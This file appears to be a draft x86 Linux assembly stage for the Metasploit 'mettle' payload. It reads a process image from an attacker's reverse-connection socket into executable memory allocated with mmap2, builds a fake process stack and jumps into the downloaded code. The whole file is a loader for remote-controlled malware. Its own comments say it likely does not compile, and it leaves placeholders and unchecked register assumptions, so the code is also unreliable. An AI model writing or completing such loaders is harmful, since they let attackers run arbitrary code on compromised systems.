; stage_mettle_x86.asm
; rough draft, i'd be very surprised if it compiles
; syscall # in eax
; ebx, ecx, edx, esi, edi, ebp

BITS 32

global _start

section .text

_start:
  ; socket fd from stager_sock_reverse will be in edi
  push edi        

  ; allocate space for mettle process image
  xor ebx, ebx    ; address
  mov ecx, =SIZE  ; length
  mov edx, 7      ; PROT_READ | PROT_WRITE | PROT_EXECUTE
  mov esi, 34     ; MAP_PRIVATE | MAP_ANONYMOUS
  xor edi, edi    ; fd
  xor ebp, ebp    ; pgoffset
  mov eax, 192    ; mmap2
  int 0x80        ; syscall

  ; recv mettle process image
  mov edx, ecx    ; ecx should still contain SIZE
  pop ebx         ; should still be SOCKFD
  mov edi, ebx    ; copy sockfd to edi for later on
  mov ecx, eax    ; mmap2'ed buffer address
  mov esi, 256    ; flags MSG_WAITALL
  mov eax, 291    ; recv
  int 0x80        ; syscall

  ; setup stack
  ; must look like:
  ; "m" (0,0,0,109)
  ; argc
  ; argv[0]
  ; socket fd
  ; NULL
  ; NULL
  ; AT_BASE
  ; mmap'ed buffer
  ; AT_NULL

  ; inefficient, but it's too late at night to be attempting pushad ...
  and esp, 0xfffffff0   ; align esp
  add esp, 260          ; add esp, see adam or a debugger for explaination
  mov eax, 109
  push eax              ; "m" (0,0,0,109)
  mov eax, 2
  push eax              ; argc
  mov eax, esp
  push eax              ; argv[0]
  push edi              ; sockfd
  xor ebx, ebx
  push ebx              ; NULL
  push ebx              ; NULL
  mov eax, 7 
  push eax              ; AT_BASE
  push ecx              ; mmap'd address (is ecx still preserved here?)
  push ebx              ; AT_NULL

  ; down the rabbit hole
  mov eax, =ENTRY
  mov ebx, =SIZE
  add eax, ebx
  jmp eax